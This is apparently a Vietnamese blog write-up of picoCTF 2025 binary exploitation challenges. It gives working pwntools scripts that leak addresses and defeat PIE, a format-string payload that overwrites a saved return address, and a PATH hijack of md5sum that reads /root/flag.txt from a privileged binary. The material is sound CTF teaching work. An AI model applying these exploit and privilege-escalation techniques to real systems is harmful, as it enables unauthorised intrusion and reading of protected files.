---
title: picoCTF 2025 (PWN)
published: true
---

# [](#header-1)PIE TIME

Kiểm tra source code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  printf("Address of main: %p\n", &main);

  unsigned long val;
  printf("Enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);
  printf("Your input: %lx\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
```

Bài này khi ta nhập input là 1 địa chỉ có tồn tại thì chương trinh sẽ nhảy đến địa chỉ đó, code leak sẵn cho ta hàm main, thế thì ta chỉ cần tính PIE base và cộng PIE base với offset của win là xong.

Xài kĩ thuật debug động sẽ tìm được offset hàm main là 0x133d

![](/img/2025-03-30-picoCTF2025/pietime1.png)

Tìm được PIE base thì ta chỉ cần tính địa chỉ win là xong:

```python 
#!/usr/bin/env python3.11
from pwn import *

elf=ELF("./vuln", checksec=False)
#r=process(elf.path)
r=remote("rescued-float.picoctf.net", 52820)
r.recvuntil(b'Address of main: ')
main=int(r.recvline(), 16)
print("Main leaked: ", hex(main))
pb=main-0x133d
win=pb+elf.sym['win']
print("Win: ", hex(win))
r.interactive()
```

![](/img/2025-03-30-picoCTF2025/pietime2.png)

# [](#header-1)hash-only-1

Để ý ở dòng trong mã giả do IDA decompile:

```c
/bin/bash -c 'md5sum /root/flag.txt'
```

Md5sum dùng để tính toán theo thuật toán md5 và sau đó lệnh sẽ in ra flag dưới dạng thuật toán đấy, ta có thể hijack nội dung của md5sum ép chương trình in ra flag thật thay vì đoạn hash

![](/img/2025-03-30-picoCTF2025/hashonly1.png)

# [](#header-1)hash-only-2

Bài này mặc định ta đang ở trong 1 môi trường có nhiều hạn chế về thực thi command, ví dụ thử với lệnh cd:

![](/img/2025-03-30-picoCTF2025/hashonly2.png)

Để thoát khỏi rbash thì nhập lệnh bash
Tìm đường dẫn tới file flaghasher rồi hijack md5sum

```bash
ctf-player@challenge:~$ mkdir /tmp/fakebin
mkdir: cannot create directory ‘/tmp/fakebin’: File exists
ctf-player@challenge:~$ echo -e '#!/bin/bash\ncat /root/flag.txt' > /tmp/fakebin/md5sum
ctf-player@challenge:~$ chmod +x /tmp/fakebin/md5sum
ctf-player@challenge:~$ export PATH=/tmp/fakebin:$PATH
ctf-player@challenge:~$ /usr/local/bin/flaghasher
Computing the MD5 hash of /root/flag.txt....

picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_9c5db6a7}
```

# [](#header-1)PIE TIME 2

Xem source code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

void call_functions() {
  char buffer[64];
  printf("Enter your name:");
  fgets(buffer, 64, stdin);
  printf(buffer);

  unsigned long val;
  printf(" enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);

  void (*foo)(void) = (void (*)())val;
  foo();
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  call_functions();
  return 0;
}
```

Bài này có lỗi format string khi print biến buffer.
Kiểm tra các lớp bảo vệ của chương trình thì có PIE, tức là phải tính toán địa chỉ win, nhưng phải kiểm tra stack có gì để leak ngay lúc print buffer không để tính được PIE base

![](/img/2025-03-30-picoCTF2025/pietime2.1.png)

Để ý ở dòng dưới cùng nó 1 địa chỉ binary có vẻ xài được

![](/img/2025-03-30-picoCTF2025/pietime2.2.png)

Đây là offset giữa địa chỉ đấy với PIE base, từ đó ta có thể tính địa chỉ win bằng cách leak binary, trừ nó với 0x1400, cộng kết quả mới trừ với offset của win với PIE base là ra hàm win, ta có thể viết script in ra offset hàm win:

```python
from pwn import *

elf=ELF("./vuln", checksec=False)
r=process(elf.path)
print("Win offset:", hex(elf.sym['win']))
r.interactive()
```
![](/img/2025-03-30-picoCTF2025/pietime2.3.png)

Để leak địa chỉ binary thì ta đếm và cần format %25$p:

![](/img/2025-03-30-picoCTF2025/pietime2.4.png)

Khi leak được thì tính toán địa chỉ bằng gdb và nhập nó vào challenge là xong.

# [](#header-1)Echo Valley

Kiểm tra source code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void print_flag() {
    char buf[32];
    FILE *file = fopen("/home/valley/flag.txt", "r");

    if (file == NULL) {
      perror("Failed to open flag file");
      exit(EXIT_FAILURE);
    }

    fgets(buf, sizeof(buf), file);
    printf("Congrats! Here is your flag: %s", buf);
    fclose(file);
    exit(EXIT_SUCCESS);
}

void echo_valley() {
    printf("Welcome to the Echo Valley, Try Shouting: \n");

    char buf[100];

    while(1)
    {
        fflush(stdout);
        if (fgets(buf, sizeof(buf), stdin) == NULL) {
          printf("\nEOF detected. Exiting...\n");
          exit(0);
        }

        if (strcmp(buf, "exit\n") == 0) {
            printf("The Valley Disappears\n");
            break;
        }

        printf("You heard in the distance: ");
        printf(buf);
        fflush(stdout);
    }
    fflush(stdout);
}

int main()
{
    echo_valley();
    return 0;
}
```
Bài này có lỗi format string được lồng vào trong hàm while(1), khả năng rất cao có thể thực hiện ghi đè GOT nhưng bài này là full relro, ta chỉ có quyền read chứ không thể thay đổi địa chỉ của GOT.

Chall này chứa hàm print_flag, tức là ta có thể cần làm gì đó với saved rip để return vào hàm print_flag

![](/img/2025-03-30-picoCTF2025/echovalley1.png)

![](/img/2025-03-30-picoCTF2025/echovalley2.png)

Ta sẽ lấy con trỏ chứa địa chỉ saved rip để ghi 2 byte cuối của print_flag vào giá trị của con trỏ đó

![](/img/2025-03-30-picoCTF2025/echovalley3.png)

Thế thì có 2 địa chỉ cần leak, 1 là 1 địa chỉ binary để tính PIE base và print địa chỉ print_flag, 2 là 1 địa chỉ con trỏ để tính offset từ đó tới con trỏ rip, từ đó có thể ghi được vào con trỏ đó

![](/img/2025-03-30-picoCTF2025/echovalley4.png)

Tính offset

![](/img/2025-03-30-picoCTF2025/echovalley5.png)

```python
#!/usr/bin/env python3.11
from pwn import *
elf=ELF("./valley", checksec=False)
r=remote("shape-facility.picoctf.net", 49437)

r.recvline()
r.sendline(b'%21$p')
r.recvuntil(b'You heard in the distance: ')
leak_bin=int(r.recvline(), 16)
print("Leak binary: ", hex(leak_bin))
offset=0x1413
pb=leak_bin-0x1413    #PIE BASE
win=pb+elf.sym['print_flag']
print("Print flag function address: ", hex(win))
r.sendline(b'%9$p')
r.recvuntil(b'You heard in the distance: ')
leak_add=int(r.recvline(), 16)+0x30
part=win & 0xffff    ##Lấy 2 byte cuối của print_flag
print("2 bytes: ", hex(part))
payload=f'%{part}c%14$hn'.encode()+b'\x00'*3
payload+=b'a'*48
payload+=p64(leak_add)
r.sendline(payload)

r.interactive()
```
